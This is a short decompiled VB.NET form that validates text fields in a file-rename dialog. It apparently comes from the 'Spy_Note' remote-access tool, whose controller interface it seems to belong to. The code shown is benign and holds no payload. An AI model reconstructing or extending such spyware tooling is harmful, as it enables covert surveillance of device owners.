Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Files_Rename
    Private Sub Files_Rename_Load(sender As Object, e As EventArgs) Handles Me.Load
        MyBase.Icon = store_0.icons_0("window")
        Me.ErrorProvider1.Icon = store_0.icons_0("errors")
    End Sub

    Private Sub Files_Rename_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        Me.ErrorProvider1.Clear()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim num As Integer = 0
        Try
            For Each obj As Object In Me.GroupBox1.Controls
                Dim control As Control = CType(obj, Control)
                Dim flag As Boolean = Operators.CompareString(Versioned.TypeName(control), "TextBox", False) = 0
                If flag Then
                    Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(control.Tag, "ERROR", False)
                    If flag2 Then
                        Dim flag3 As Boolean = control.Text.Length = 0
                        If flag3 Then
                            Me.ErrorProvider1.SetError(control, "Cannot be Empty")
                        Else
                            Me.ErrorProvider1.SetError(control, Nothing)
                            num += 1
                        End If
                    End If
                End If
            Next
        Finally
        End Try
        Dim flag4 As Boolean = num = 1
        If flag4 Then
            MyBase.DialogResult = DialogResult.OK
        End If
    End Sub
End Class